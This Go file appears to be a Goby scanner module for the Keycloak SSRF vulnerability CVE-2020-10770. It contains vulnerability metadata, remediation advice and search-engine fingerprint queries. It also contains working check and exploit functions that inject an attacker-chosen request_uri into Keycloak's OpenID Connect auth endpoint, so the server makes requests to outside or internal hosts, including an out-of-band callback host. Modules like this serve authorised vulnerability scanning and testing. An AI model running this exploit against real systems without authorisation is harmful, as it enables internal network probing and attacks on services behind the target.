package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Keycloak 12.0.1 SSRF (CVE-2020-10770)",
    "Description": "<p>Keycloak is an open source identity and access management system.</p><p>Before Keycloak 13.0.0 version, the request_uri parameter has an unauthorized SSRF vulnerability. Attackers can use the vulnerability to detect intranet ports to attack internal applications.</p>",
    "Impact": "Keycloak 12.0.1 SSRF (CVE-2020-10770)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.keycloak.org\">https://www.keycloak.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Keycloak",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Keycloak 身份验证系统12.0.1版本存在 SSRF 漏洞（CVE-2020-10770）",
            "Description": "<p>Keycloak 是一个开源身份和访问管理系统。</p><p>Keycloak13.0.0版本之前request_uri参数存在一个未授权的SSRF漏洞，攻击者可利用漏洞探测内网端口攻击内部应用。</p>",
            "Impact": "<p>Keycloak13.0.0版本之前request_uri参数存在一个未授权的SSRF漏洞，攻击者可利用漏洞探测内网端口攻击内部应用。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.keycloak.org\">https://www.keycloak.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Keycloak",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Keycloak 12.0.1 SSRF (CVE-2020-10770)",
            "Description": "<p>Keycloak is an open source identity and access management system.</p><p>Before Keycloak 13.0.0 version, the request_uri parameter has an unauthorized SSRF vulnerability. Attackers can use the vulnerability to detect intranet ports to attack internal applications.</p>",
            "Impact": "Keycloak 12.0.1 SSRF (CVE-2020-10770)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.keycloak.org\">https://www.keycloak.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "Keycloak",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "body=\"www.fsf.org\" && (body=\"Welcome to Keycloak\" || title=\"Welcome to Keycloak\" || body=\"User Guide, Admin REST API and Javadocs\")",
    "GobyQuery": "body=\"www.fsf.org\" && (body=\"Welcome to Keycloak\" || title=\"Welcome to Keycloak\" || body=\"User Guide, Admin REST API and Javadocs\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.keycloak.org",
    "DisclosureDate": "2021-10-14",
    "References": [
        "https://www.exploit-db.com/exploits/50405"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2020-10770"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ssrf",
            "type": "input",
            "value": "http://www.baidu.com",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Keycloak"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10235"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://" + checkUrl
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*15)
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["ssrf"].(string)
			uri := "/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "this is a blind ssrf\n" + resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}
